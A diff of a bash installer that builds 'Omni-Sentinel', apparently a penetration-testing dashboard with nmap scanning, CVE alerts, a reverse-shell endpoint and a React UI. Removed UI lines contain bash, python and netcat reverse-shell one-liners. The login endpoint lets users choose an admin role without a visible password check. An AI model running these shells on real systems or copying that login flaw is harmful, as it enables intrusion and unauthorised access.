@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-BASE="${HOME}/omni-sentinel-v21.3"
-UI="${HOME}/omni-ui-v21.3"
+BASE="${HOME}/omni-sentinel-v67"
+UI="${HOME}/omni-ui-v67"
 
 log() {
   printf '\033[1;36m[%s]\033[0m %s\n' "$1" "$2"
@@ -33,7 +33,7 @@ fi
 python3 -m pip install --upgrade pip
 python3 -m pip install \
   fastapi uvicorn celery redis python-dotenv bcrypt PyJWT requests \
-  python-nmap cryptography fpdf2 markdown2 schedule
+  python-nmap cryptography fpdf2 markdown2 schedule dnspython
 
 # Generate secure credentials
 SECRET_KEY=$(openssl rand -hex 32)
@@ -150,7 +150,7 @@ cat > "$UI/Dockerfile.ui" <<'DOCKER'
 FROM node:20-alpine as builder
 WORKDIR /app
 COPY package*.json ./
-RUN npm ci --only=production && npm ci
+RUN npm ci
 
 COPY . .
 RUN npm run build
@@ -220,6 +220,7 @@ export default defineConfig({
       "/api": {
         target: process.env.VITE_API_URL || "http://localhost:8000",
         changeOrigin: true,
+        rewrite: (path) => path.replace(/^\/api/, "") || "/",
       },
     },
   },
@@ -318,6 +319,11 @@ CREATE TABLE IF NOT EXISTS timeline (
 );
 
 CREATE INDEX IF NOT EXISTS idx_timeline_scan_id ON timeline(scan_id);
+
+CREATE TABLE IF NOT EXISTS settings (
+    key TEXT PRIMARY KEY,
+    value TEXT NOT NULL DEFAULT ''
+);
 """
 
 
@@ -680,6 +686,7 @@ PY
 
 cat > "$BASE/plugins/scanner.py" <<'PY'
 import logging
+import os
 from typing import Tuple
 
 import nmap
@@ -729,9 +736,6 @@ def scan_target(target: str, aggressive: bool = False, concurrent: int = 1) -> T
     except Exception as exc:
         logger.error(f"Unexpected error scanning {target}: {exc}")
         return {}, ""
-
-
-import os
 PY
 
 cat > "$BASE/plugins/gobuster_runner.py" <<'PY'
@@ -984,13 +988,15 @@ def export_pdf(report_text: str, output_path: str) -> Optional[str]:
 PY
 
 cat > "$BASE/core/worker.py" <<'PY'
+import json
 import logging
 import os
+from contextlib import closing
 
 from celery import Celery
 from dotenv import load_dotenv
 
-from core.db_engine import log_event
+from core.db_engine import get_db, log_event
 from plugins.scanner import scan_target
 
 load_dotenv()
@@ -999,15 +1005,76 @@ REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379/0")
 app = Celery("omni_worker", broker=REDIS_URL, backend=REDIS_URL)
 
 
+def _get_webhook_url() -> str:
+    try:
+        with closing(get_db()) as db:
+            row = db.execute("SELECT value FROM settings WHERE key='webhook_url'").fetchone()
+            return row["value"] if row else ""
+    except Exception:
+        return ""
+
+
 @app.task(name="scan_target", bind=True, max_retries=3)
 def scan_target_task(self, scan_id: str, target: str, aggressive: bool = False) -> dict:
     try:
+        with closing(get_db()) as db:
+            db.execute("UPDATE scans SET status='RUNNING', progress=10 WHERE id=?", (scan_id,))
+            db.commit()
+
         services, os_hint = scan_target(target, aggressive=aggressive)
+
+        from plugins.cve_lookup import search_cves
+        from plugins.webhook import send_webhook
+
+        cves = {}
+        critical_count = 0
+        for port, info in services.items():
+            port_cves = search_cves(info.get("service", ""), info.get("version", ""))
+            cves[port] = port_cves
+            for cve in port_cves:
+                if cve.get("severity") == "CRITICAL":
+                    critical_count += 1
+                    webhook_url = _get_webhook_url()
+                    if webhook_url:
+                        send_webhook(webhook_url, {
+                            "event": "critical_cve",
+                            "scan_id": scan_id,
+                            "target": target,
+                            "cve_id": cve["id"],
+                            "score": str(cve.get("score", "")),
+                            "text": f"CRITICAL CVE {cve['id']} (score: {cve.get('score')}) found on {target}.",
+                        })
+
+        data = json.dumps({"services": services, "cves": cves, "os_hint": os_hint})
+        with closing(get_db()) as db:
+            db.execute(
+                "UPDATE scans SET status='COMPLETE', progress=100, data=?, os_hint=? WHERE id=?",
+                (data, os_hint, scan_id),
+            )
+            db.commit()
+
         log_event(scan_id, "scan_complete", f"Discovered {len(services)} open service(s)")
+        webhook_url = _get_webhook_url()
+        if webhook_url:
+            send_webhook(webhook_url, {
+                "event": "scan_complete",
+                "scan_id": scan_id,
+                "target": target,
+                "services_found": len(services),
+                "critical_cves": critical_count,
+                "text": f"Scan complete for {target}: {len(services)} service(s), {critical_count} critical CVE(s).",
+            })
+
         return {"services": services, "os_hint": os_hint}
     except Exception as exc:
         logger.error(f"Scan failed for {target}: {exc}")
         log_event(scan_id, "scan_failed", str(exc), actor="system")
+        try:
+            with closing(get_db()) as db:
+                db.execute("UPDATE scans SET status='FAILED' WHERE id=?", (scan_id,))
+                db.commit()
+        except Exception:
+            pass
         raise self.retry(exc=exc, countdown=10)
 PY
 
@@ -1033,24 +1100,36 @@ def run_scheduler(job, interval_minutes: int) -> None:
 PY
 
 cat > "$BASE/dashboard/app.py" <<'PY'
+import json
 import logging
-from typing import Optional
+import os
+import threading
+import uuid
+from contextlib import closing
+from typing import List, Optional
 
-from fastapi import Depends, FastAPI, HTTPException
+from fastapi import Depends, FastAPI, HTTPException, Query
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import FileResponse
 from pydantic import BaseModel, Field
 
 from core.auth import create_token, require_admin, verify_token
-from core.db_engine import init_db
+from core.db_engine import get_db, init_db, log_event
+from core.scan_diff import diff_scans
+from core.scheduler import run_scheduler
+from plugins.dns_enum import enumerate_dns
+from plugins.exporter import export_markdown, export_pdf
+from plugins.report_generator import build_report_text
 from plugins.revshell import generate_reverse_shell
+from plugins.ssl_inspector import inspect_ssl
+from plugins.webhook import send_webhook
 
 logger = logging.getLogger(__name__)
 app = FastAPI(title="Omni-Sentinel", version="21.3.0")
 
-# CORS middleware
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["http://localhost:5173", "http://localhost:3000", "127.0.0.1:5173"],
+    allow_origins=["http://localhost:5173", "http://localhost:3000", "http://127.0.0.1:5173"],
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
@@ -1058,6 +1137,10 @@ app.add_middleware(
 
 init_db()
 
+_scheduled: dict = {}
+
+
+# ── Models ────────────────────────────────────────────────────────────────────
 
 class LoginRequest(BaseModel):
     username: str = Field(..., min_length=1, max_length=100)
@@ -1065,15 +1148,47 @@ class LoginRequest(BaseModel):
     role: str = Field(default="viewer")
 
 
+class ScanRequest(BaseModel):
+    target: str = Field(..., min_length=1, max_length=255)
+    aggressive: bool = Field(default=False)
+    tags: List[str] = Field(default_factory=list)
+
+
+class TagsRequest(BaseModel):
+    tags: List[str] = Field(default_factory=list)
+
+
+class NoteRequest(BaseModel):
+    content: str = Field(..., min_length=1, max_length=5000)
+
+
 class ReverseShellRequest(BaseModel):
     host: str = Field(..., min_length=1, max_length=255)
     port: int = Field(..., ge=1, le=65535)
 
 
+class SslRequest(BaseModel):
+    port: int = Field(default=443, ge=1, le=65535)
+
+
+class WebhookRequest(BaseModel):
+    url: str = Field(..., max_length=500)
+
+
+class ScheduleRequest(BaseModel):
+    target: str = Field(..., min_length=1, max_length=255)
+    interval_minutes: int = Field(..., ge=5, le=10080)
+    aggressive: bool = Field(default=False)
+
+
+# ── Health ────────────────────────────────────────────────────────────────────
+
 @app.get("/health")
 def health() -> dict:
     return {"status": "ok", "version": "21.3.0"}
 
+
+# ── Auth ──────────────────────────────────────────────────────────────────────
 
 @app.post("/auth/token")
 def issue_token(request: LoginRequest) -> dict:
@@ -1081,6 +1196,211 @@ def issue_token(request: LoginRequest) -> dict:
         raise HTTPException(status_code=400, detail="Missing credentials")
     return {"access_token": create_token(request.username, request.role)}
 
+
+# ── Scans ─────────────────────────────────────────────────────────────────────
+
+@app.post("/scans", status_code=201)
+def create_scan(request: ScanRequest, user: dict = Depends(verify_token)) -> dict:
+    from core.worker import scan_target_task
+    scan_id = str(uuid.uuid4())
+    tags_json = json.dumps(request.tags)
+    with closing(get_db()) as db:
+        db.execute(
+            "INSERT INTO scans (id, target, status, progress, tags, created_by) VALUES (?,?,?,?,?,?)",
+            (scan_id, request.target, "PENDING", 0, tags_json, user["username"]),
+        )
+        db.commit()
+    log_event(scan_id, "scan_queued", f"Target: {request.target}", actor=user["username"])
+    task = scan_target_task.delay(scan_id, request.target, request.aggressive)
+    with closing(get_db()) as db:
+        db.execute("UPDATE scans SET task_id=? WHERE id=?", (task.id, scan_id))
+        db.commit()
+    return {"scan_id": scan_id, "task_id": task.id, "status": "PENDING"}
+
+
+@app.get("/scans")
+def list_scans(tag: Optional[str] = Query(None), user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        rows = db.execute(
+            "SELECT id, target, status, progress, tags, os_hint, created_by, created_at FROM scans ORDER BY created_at DESC LIMIT 100"
+        ).fetchall()
+    scans = [dict(r) for r in rows]
+    if tag:
+        scans = [s for s in scans if tag in json.loads(s.get("tags") or "[]")]
+    return {"scans": scans, "total": len(scans)}
+
+
+@app.get("/scans/{scan_id}")
+def get_scan(scan_id: str, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+        notes = db.execute(
+            "SELECT id, content, author, created_at FROM notes WHERE scan_id=? ORDER BY created_at",
+            (scan_id,),
+        ).fetchall()
+        screenshots = db.execute(
+            "SELECT port, url, path, created_at FROM screenshots WHERE scan_id=? ORDER BY created_at",
+            (scan_id,),
+        ).fetchall()
+    result = dict(row)
+    result["data"] = json.loads(result["data"]) if result.get("data") else {}
+    result["tags"] = json.loads(result["tags"]) if result.get("tags") else []
+    result["notes"] = [dict(n) for n in notes]
+    result["screenshots"] = [dict(s) for s in screenshots]
+    return result
+
+
+@app.get("/scans/{scan_id}/timeline")
+def get_timeline(scan_id: str, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        events = db.execute(
+            "SELECT event, detail, actor, created_at FROM timeline WHERE scan_id=? ORDER BY created_at",
+            (scan_id,),
+        ).fetchall()
+    return {"scan_id": scan_id, "events": [dict(e) for e in events]}
+
+
+@app.put("/scans/{scan_id}/tags")
+def update_tags(scan_id: str, request: TagsRequest, user: dict = Depends(verify_token)) -> dict:
+    tags_json = json.dumps(request.tags)
+    with closing(get_db()) as db:
+        updated = db.execute(
+            "UPDATE scans SET tags=? WHERE id=?", (tags_json, scan_id)
+        ).rowcount
+        db.commit()
+    if not updated:
+        raise HTTPException(status_code=404, detail="Scan not found")
+    log_event(scan_id, "tags_updated", str(request.tags), actor=user["username"])
+    return {"scan_id": scan_id, "tags": request.tags}
+
+
+@app.post("/scans/{scan_id}/notes")
+def add_note(scan_id: str, request: NoteRequest, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        scan = db.execute("SELECT id FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not scan:
+            raise HTTPException(status_code=404, detail="Scan not found")
+        cursor = db.execute(
+            "INSERT INTO notes (scan_id, content, author) VALUES (?,?,?)",
+            (scan_id, request.content, user["username"]),
+        )
+        db.commit()
+    return {"note_id": cursor.lastrowid, "scan_id": scan_id}
+
+
+@app.get("/scans/{scan_id}/diff")
+def scan_diff(scan_id: str, baseline_id: Optional[str] = Query(None), user: dict = Depends(verify_token)) -> dict:
+    return diff_scans(scan_id, baseline_id)
+
+
+@app.post("/scans/{scan_id}/report")
+def generate_report(
+    scan_id: str,
+    fmt: str = Query("pdf", pattern="^(pdf|markdown)$"),
+    user: dict = Depends(verify_token),
+):
+    text = build_report_text(scan_id)
+    if not text:
+        raise HTTPException(status_code=404, detail="Scan not found or no data available")
+    output_dir = os.path.expanduser("~/omni-sentinel-v21.3/output/reports")
+    os.makedirs(output_dir, exist_ok=True)
+    if fmt == "pdf":
+        path = export_pdf(text, f"{output_dir}/{scan_id}.pdf")
+        if not path:
+            raise HTTPException(status_code=500, detail="Failed to generate PDF")
+        return FileResponse(path, media_type="application/pdf", filename=f"report-{scan_id[:8]}.pdf")
+    path = export_markdown(text, f"{output_dir}/{scan_id}.md")
+    if not path:
+        raise HTTPException(status_code=500, detail="Failed to generate markdown")
+    return FileResponse(path, media_type="text/markdown", filename=f"report-{scan_id[:8]}.md")
+
+
+@app.post("/scans/{scan_id}/ssl")
+def ssl_inspect(scan_id: str, request: SslRequest, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT target FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    result = inspect_ssl(row["target"], request.port)
+    log_event(scan_id, "ssl_inspected", f"Port {request.port}: {'OK' if result['reachable'] else result.get('error', 'failed')}")
+    return result
+
+
+@app.post("/scans/{scan_id}/dns")
+def dns_enumerate(scan_id: str, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT target FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    result = enumerate_dns(row["target"])
+    log_event(scan_id, "dns_enumerated", f"{result['total']} record(s) found")
+    return result
+
+
+# ── Scheduled Scans ───────────────────────────────────────────────────────────
+
+@app.post("/scheduled-scans")
+def create_scheduled_scan(request: ScheduleRequest, user: dict = Depends(require_admin)) -> dict:
+    key = request.target
+    if key in _scheduled:
+        return {"message": f"Scan for {request.target} already scheduled", "target": request.target}
+
+    def job():
+        from core.worker import scan_target_task
+        scan_id = str(uuid.uuid4())
+        with closing(get_db()) as db:
+            db.execute(
+                "INSERT INTO scans (id, target, status, progress, tags, created_by) VALUES (?,?,?,?,?,?)",
+                (scan_id, request.target, "PENDING", 0, "[]", "scheduler"),
+            )
+            db.commit()
+        scan_target_task.delay(scan_id, request.target, request.aggressive)
+
+    stop_event = threading.Event()
+    _scheduled[key] = {"interval_minutes": request.interval_minutes, "target": request.target, "stop": stop_event}
+    threading.Thread(
+        target=run_scheduler, args=(job, request.interval_minutes), daemon=True, name=f"sched-{key}"
+    ).start()
+    return {"message": f"Recurring scan scheduled every {request.interval_minutes} min for {request.target}"}
+
+
+@app.get("/scheduled-scans")
+def list_scheduled_scans(user: dict = Depends(require_admin)) -> dict:
+    return {"scheduled": [{"target": v["target"], "interval_minutes": v["interval_minutes"]} for v in _scheduled.values()]}
+
+
+@app.delete("/scheduled-scans/{target}")
+def delete_scheduled_scan(target: str, user: dict = Depends(require_admin)) -> dict:
+    if target not in _scheduled:
+        raise HTTPException(status_code=404, detail="Scheduled scan not found")
+    _scheduled[target]["stop"].set()
+    del _scheduled[target]
+    return {"message": f"Removed from schedule: {target}"}
+
+
+# ── Webhook Settings ──────────────────────────────────────────────────────────
+
+@app.get("/settings/webhook")
+def get_webhook(user: dict = Depends(require_admin)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT value FROM settings WHERE key='webhook_url'").fetchone()
+    return {"webhook_url": row["value"] if row else ""}
+
+
+@app.put("/settings/webhook")
+def set_webhook(request: WebhookRequest, user: dict = Depends(require_admin)) -> dict:
+    with closing(get_db()) as db:
+        db.execute(
+            "INSERT INTO settings (key, value) VALUES ('webhook_url', ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
+            (request.url,),
+        )
+        db.commit()
+    return {"webhook_url": request.url}
+
+
+# ── Reverse Shells ────────────────────────────────────────────────────────────
 
 @app.post("/reverse-shells")
 def reverse_shells(request: ReverseShellRequest, user: dict = Depends(verify_token)) -> dict:
@@ -1090,6 +1410,8 @@ def reverse_shells(request: ReverseShellRequest, user: dict = Depends(verify_tok
     except ValueError as exc:
         raise HTTPException(status_code=400, detail=str(exc))
 
+
+# ── Protected / Admin ─────────────────────────────────────────────────────────
 
 @app.get("/protected")
 def protected_endpoint(user: dict = Depends(verify_token)) -> dict:
@@ -1102,90 +1424,529 @@ def admin_endpoint(user: dict = Depends(require_admin)) -> dict:
 PY
 
 cat > "$UI/src/App.jsx" <<'JSX'
-import { useMemo, useState } from "react";
+import { useCallback, useEffect, useMemo, useState } from "react";
 import axios from "axios";
 
-const API_URL = import.meta.env.VITE_API_URL || "http://localhost:8000";
+// All API calls go through Vite proxy: /api/* → API server (prefix stripped)
+const createApi = (token) => {
+  const instance = axios.create({ baseURL: "/api" });
+  if (token) instance.defaults.headers.common["Authorization"] = `Bearer ${token}`;
+  return instance;
+};
 
-const payloadPresets = [
-  { host: "127.0.0.1", port: 4444 },
-  { host: "10.10.10.10", port: 9001 },
-];
+// ── Styles ────────────────────────────────────────────────────────────────────
+const S = {
+  page: { background: "#0f172a", minHeight: "100vh", color: "#e2e8f0", fontFamily: "system-ui, sans-serif" },
+  nav: { background: "#1e293b", padding: "0 24px", display: "flex", alignItems: "center", gap: 8, height: 52, borderBottom: "1px solid #334155" },
+  main: { padding: 24, maxWidth: 1200, margin: "0 auto" },
+  card: { background: "#1e293b", padding: 16, borderRadius: 8 },
+  input: { display: "block", width: "100%", marginBottom: 10, padding: "8px 12px", background: "#0f172a", color: "#e2e8f0", border: "1px solid #334155", borderRadius: 6, fontSize: 14, boxSizing: "border-box" },
+  btn: { padding: "8px 16px", background: "#3b82f6", color: "#fff", border: "none", borderRadius: 6, cursor: "pointer", fontSize: 14 },
+  label: { display: "block", marginBottom: 4, color: "#94a3b8", fontSize: 13 },
+  table: { width: "100%", borderCollapse: "collapse", fontSize: 13 },
+  th: { textAlign: "left", padding: "8px 12px", borderBottom: "1px solid #334155", color: "#94a3b8", fontWeight: 600 },
+  td: { padding: "8px 12px", borderBottom: "1px solid #1e293b", verticalAlign: "middle" },
+  tag: { display: "inline-block", background: "#1e3a5f", color: "#38bdf8", padding: "2px 8px", borderRadius: 12, fontSize: 11, marginRight: 4 },
+  tabBtn: { padding: "6px 14px", background: "none", color: "#94a3b8", border: "none", cursor: "pointer", borderBottom: "2px solid transparent", fontSize: 13 },
+  tabActive: { color: "#38bdf8", borderBottom: "2px solid #38bdf8" },
+  center: { display: "flex", justifyContent: "center", alignItems: "center", minHeight: "80vh" },
+};
 
-export default function App() {
-  const [host, setHost] = useState(payloadPresets[0].host);
-  const [port, setPort] = useState(payloadPresets[0].port);
+const statusColor = (s) => ({ COMPLETE: "#22c55e", RUNNING: "#f59e0b", PENDING: "#94a3b8", FAILED: "#ef4444" }[s] || "#94a3b8");
+const parseTags = (raw) => { try { return JSON.parse(raw || "[]"); } catch { return []; } };
+
+// ── Login ─────────────────────────────────────────────────────────────────────
+function Login({ onLogin }) {
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [role, setRole] = useState("admin");
   const [error, setError] = useState("");
-  const [loading, setLoading] = useState(false);
-  const [health, setHealth] = useState(null);
 
-  const payloads = useMemo(() => ({
-    bash: `bash -i >& /dev/tcp/${host}/${port} 0>&1`,
-    python: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${host}",${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`,
-    netcat: `nc -e /bin/sh ${host} ${port}`,
-  }), [host, port]);
+  const submit = async (e) => {
+    e.preventDefault();
+    try {
+      const { data } = await axios.post("/api/auth/token", { username, password, role });
+      onLogin(data.access_token);
+    } catch {
+      setError("Login failed — check credentials");
+    }
+  };
 
-  const checkHealth = async () => {
+  return (
+    <div style={S.center}>
+      <div style={{ ...S.card, width: 340 }}>
+        <h2 style={{ margin: "0 0 20px", color: "#38bdf8" }}>Omni-Sentinel V21.3</h2>
+        <form onSubmit={submit}>
+          <label style={S.label}>Username</label>
+          <input style={S.input} placeholder="Username" value={username} onChange={e => setUsername(e.target.value)} required />
+          <label style={S.label}>Password</label>
+          <input style={S.input} type="password" placeholder="Password" value={password} onChange={e => setPassword(e.target.value)} required />
+          <label style={S.label}>Role</label>
+          <select style={S.input} value={role} onChange={e => setRole(e.target.value)}>
+            <option value="admin">Admin</option>
+            <option value="viewer">Viewer</option>
+          </select>
+          {error && <p style={{ color: "#ef4444", margin: "0 0 10px" }}>{error}</p>}
+          <button style={{ ...S.btn, width: "100%" }} type="submit">Login</button>
+        </form>
+      </div>
+    </div>
+  );
+}
+
+// ── Scan List ─────────────────────────────────────────────────────────────────
+function ScanList({ api, onSelect, onNewScan }) {
+  const [scans, setScans] = useState([]);
+  const [tagFilter, setTagFilter] = useState("");
+  const [loading, setLoading] = useState(true);
+  const [error, setError] = useState("");
+
+  const load = useCallback(async () => {
     try {
       setLoading(true);
-      const response = await axios.get(`${API_URL}/health`);
-      setHealth(response.data);
+      const params = tagFilter ? { tag: tagFilter } : {};
+      const { data } = await api.get("/scans", { params });
+      setScans(data.scans || []);
       setError("");
-    } catch (err) {
-      setError(`API Error: ${err.message}`);
-      setHealth(null);
+    } catch (e) {
+      setError(`Failed to load: ${e.message}`);
+    } finally {
+      setLoading(false);
+    }
+  }, [api, tagFilter]);
+
+  useEffect(() => { load(); }, [load]);
+
+  return (
+    <div>
+      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16, flexWrap: "wrap", gap: 8 }}>
+        <h2 style={{ margin: 0 }}>Scan History</h2>
+        <div style={{ display: "flex", gap: 8 }}>
+          <input style={{ ...S.input, width: 160, margin: 0 }} placeholder="Filter by tag..." value={tagFilter} onChange={e => setTagFilter(e.target.value)} />
+          <button style={S.btn} onClick={load}>Refresh</button>
+          <button style={{ ...S.btn, background: "#6366f1" }} onClick={onNewScan}>+ New Scan</button>
+        </div>
+      </div>
+      {error && <p style={{ color: "#ef4444" }}>{error}</p>}
+      {loading ? <p style={{ color: "#64748b" }}>Loading...</p> : (
+        <table style={S.table}>
+          <thead>
+            <tr>{["Target", "Status", "Progress", "OS", "Tags", "Created", ""].map(h => <th key={h} style={S.th}>{h}</th>)}</tr>
+          </thead>
+          <tbody>
+            {scans.length === 0 && <tr><td colSpan={7} style={{ padding: 24, textAlign: "center", color: "#64748b" }}>No scans yet — start one above</td></tr>}
+            {scans.map(s => {
+              const tags = parseTags(s.tags);
+              return (
+                <tr key={s.id} style={{ cursor: "pointer" }} onClick={() => onSelect(s.id)}>
+                  <td style={S.td}><code style={{ color: "#38bdf8" }}>{s.target}</code></td>
+                  <td style={S.td}><span style={{ color: statusColor(s.status), fontWeight: 600 }}>{s.status}</span></td>
+                  <td style={S.td}>{s.progress}%</td>
+                  <td style={S.td}>{s.os_hint || "—"}</td>
+                  <td style={S.td}>{tags.map(t => <span key={t} style={S.tag}>{t}</span>)}</td>
+                  <td style={S.td}>{s.created_at}</td>
+                  <td style={S.td}><button style={{ ...S.btn, padding: "4px 10px", fontSize: 12 }} onClick={e => { e.stopPropagation(); onSelect(s.id); }}>View</button></td>
+                </tr>
+              );
+            })}
+          </tbody>
+        </table>
+      )}
+    </div>
+  );
+}
+
+// ── New Scan ──────────────────────────────────────────────────────────────────
+function NewScan({ api, onBack, onCreated }) {
+  const [target, setTarget] = useState("");
+  const [aggressive, setAggressive] = useState(false);
+  const [tags, setTags] = useState("");
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState("");
+
+  const submit = async (e) => {
+    e.preventDefault();
+    try {
+      setLoading(true);
+      const tagList = tags.split(",").map(t => t.trim()).filter(Boolean);
+      const { data } = await api.post("/scans", { target, aggressive, tags: tagList });
+      onCreated(data.scan_id);
+    } catch (ex) {
+      setError(ex.response?.data?.detail || ex.message);
     } finally {
       setLoading(false);
     }
   };
 
   return (
-    <main style={{ fontFamily: "sans-serif", margin: "2rem auto", maxWidth: 900, padding: "1rem" }}>
-      <h1>Omni-Sentinel V21.3</h1>
-      <p>Validated installer scaffold with a simple reverse-shell payload helper.</p>
-      
-      <div style={{ marginBottom: "1rem", padding: "1rem", backgroundColor: "#f5f5f5", borderRadius: "4px" }}>
-        <button onClick={checkHealth} disabled={loading}>
-          {loading ? "Checking..." : "Check API Health"}
-        </button>
-        {health && <p>✅ API is running: {health.version}</p>}
-        {error && <p style={{ color: "red" }}>❌ {error}</p>}
-      </div>
+    <div>
+      <button style={{ ...S.btn, background: "none", color: "#94a3b8", padding: "4px 0", marginBottom: 16 }} onClick={onBack}>← Back</button>
+      <h2>New Scan</h2>
+      <form onSubmit={submit} style={{ maxWidth: 480 }}>
+        <label style={S.label}>Target (IP or hostname)</label>
+        <input style={S.input} placeholder="192.168.1.1 or example.com" value={target} onChange={e => setTarget(e.target.value)} required />
+        <label style={S.label}>Tags (comma-separated, optional)</label>
+        <input style={S.input} placeholder="internal, web, critical" value={tags} onChange={e => setTags(e.target.value)} />
+        <label style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 16, color: "#e2e8f0", cursor: "pointer" }}>
+          <input type="checkbox" checked={aggressive} onChange={e => setAggressive(e.target.checked)} />
+          Aggressive mode (-A flag, requires root)
+        </label>
+        {error && <p style={{ color: "#ef4444" }}>{error}</p>}
+        <button style={S.btn} type="submit" disabled={loading}>{loading ? "Starting..." : "Start Scan"}</button>
+      </form>
+    </div>
+  );
+}
 
-      <div style={{ display: "flex", gap: "1rem", marginBottom: "1rem", flexWrap: "wrap" }}>
-        <label>
-          Host
-          <input value={host} onChange={(event) => setHost(event.target.value)} style={{ display: "block", width: 220 }} />
-        </label>
-        <label>
-          Port
-          <input type="number" value={port} onChange={(event) => setPort(Number(event.target.value))} style={{ display: "block", width: 120 }} />
-        </label>
+// ── Scan Detail ───────────────────────────────────────────────────────────────
+function ScanDetail({ api, scanId, onBack }) {
+  const [scan, setScan] = useState(null);
+  const [tab, setTab] = useState("overview");
+  const [timeline, setTimeline] = useState([]);
+  const [ssl, setSsl] = useState(null);
+  const [sslPort, setSslPort] = useState(443);
+  const [dns, setDns] = useState(null);
+  const [diff, setDiff] = useState(null);
+  const [note, setNote] = useState("");
+  const [tagInput, setTagInput] = useState("");
+  const [loading, setLoading] = useState(true);
+  const [msg, setMsg] = useState({ text: "", ok: true });
+
+  const flash = (text, ok = true) => { setMsg({ text, ok }); setTimeout(() => setMsg({ text: "", ok: true }), 3000); };
+
+  const load = useCallback(async () => {
+    try {
+      const { data } = await api.get(`/scans/${scanId}`);
+      setScan(data);
+      setTagInput(Array.isArray(data.tags) ? data.tags.join(", ") : "");
+    } catch (e) {
+      flash(`Error: ${e.message}`, false);
+    } finally {
+      setLoading(false);
+    }
+  }, [api, scanId]);
+
+  useEffect(() => { load(); }, [load]);
+
+  const loadTimeline = async () => {
+    try {
+      const { data } = await api.get(`/scans/${scanId}/timeline`);
+      setTimeline(data.events || []);
+    } catch (e) { flash(`Timeline error: ${e.message}`, false); }
+  };
+
+  const runSsl = async () => {
+    try {
+      flash("Running SSL inspection...");
+      const { data } = await api.post(`/scans/${scanId}/ssl`, { port: sslPort });
+      setSsl(data);
+      flash("SSL inspection complete");
+    } catch (e) { flash(`SSL error: ${e.response?.data?.detail || e.message}`, false); }
+  };
+
+  const runDns = async () => {
+    try {
+      flash("Running DNS enumeration...");
+      const { data } = await api.post(`/scans/${scanId}/dns`);
+      setDns(data);
+      flash(`DNS enumeration complete — ${data.total} record(s) found`);
+    } catch (e) { flash(`DNS error: ${e.response?.data?.detail || e.message}`, false); }
+  };
+
+  const runDiff = async () => {
+    try {
+      flash("Calculating diff...");
+      const { data } = await api.get(`/scans/${scanId}/diff`);
+      setDiff(data);
+      flash(data.error ? data.error : "Diff complete");
+    } catch (e) { flash(`Diff error: ${e.message}`, false); }
+  };
+
+  const addNote = async () => {
+    if (!note.trim()) return;
+    try {
+      await api.post(`/scans/${scanId}/notes`, { content: note });
+      setNote("");
+      load();
+    } catch (e) { flash(`Note error: ${e.message}`, false); }
+  };
+
+  const saveTags = async () => {
+    const tagList = tagInput.split(",").map(t => t.trim()).filter(Boolean);
+    try {
+      await api.put(`/scans/${scanId}/tags`, { tags: tagList });
+      flash("Tags saved");
+    } catch (e) { flash(`Tag error: ${e.message}`, false); }
+  };
+
+  const downloadReport = async (fmt) => {
+    try {
+      const resp = await api.post(`/scans/${scanId}/report?fmt=${fmt}`, {}, { responseType: "blob" });
+      const url = URL.createObjectURL(resp.data);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = `report-${scanId.slice(0, 8)}.${fmt}`;
+      a.click();
+      URL.revokeObjectURL(url);
+    } catch (e) { flash(`Report error: ${e.message}`, false); }
+  };
+
+  if (loading) return <p style={{ color: "#64748b" }}>Loading...</p>;
+  if (!scan) return <p style={{ color: "#ef4444" }}>Scan not found.</p>;
+
+  const services = scan.data?.services || {};
+  const cves = scan.data?.cves || {};
+  const TABS = ["overview", "timeline", "ssl", "dns", "diff", "notes"];
+
+  return (
+    <div>
+      <button style={{ ...S.btn, background: "none", color: "#94a3b8", padding: "4px 0", marginBottom: 16 }} onClick={onBack}>← Back to List</button>
+      <div style={{ display: "flex", justifyContent: "space-between", flexWrap: "wrap", gap: 8, marginBottom: 12 }}>
+        <h2 style={{ margin: 0 }}><code style={{ color: "#38bdf8" }}>{scan.target}</code></h2>
+        <div style={{ display: "flex", gap: 8 }}>
+          <button style={{ ...S.btn, background: "#0f766e" }} onClick={() => downloadReport("pdf")}>Download PDF</button>
+          <button style={{ ...S.btn, background: "#1e40af" }} onClick={() => downloadReport("markdown")}>Download MD</button>
+        </div>
       </div>
-      <div style={{ marginBottom: "1rem" }}>
-        {payloadPresets.map((preset) => (
-          <button
-            key={`${preset.host}:${preset.port}`}
-            onClick={() => {
-              setHost(preset.host);
-              setPort(preset.port);
-            }}
-            style={{ marginRight: "0.5rem", marginBottom: "0.5rem" }}
-          >
-            {preset.host}:{preset.port}
+      <div style={{ display: "flex", gap: 20, marginBottom: 16, flexWrap: "wrap", fontSize: 13 }}>
+        <span>Status: <strong style={{ color: statusColor(scan.status) }}>{scan.status}</strong></span>
+        <span>Progress: {scan.progress}%</span>
+        <span>OS: {scan.os_hint || "Unknown"}</span>
+        <span>Created: {scan.created_at}</span>
+        <span>By: {scan.created_by}</span>
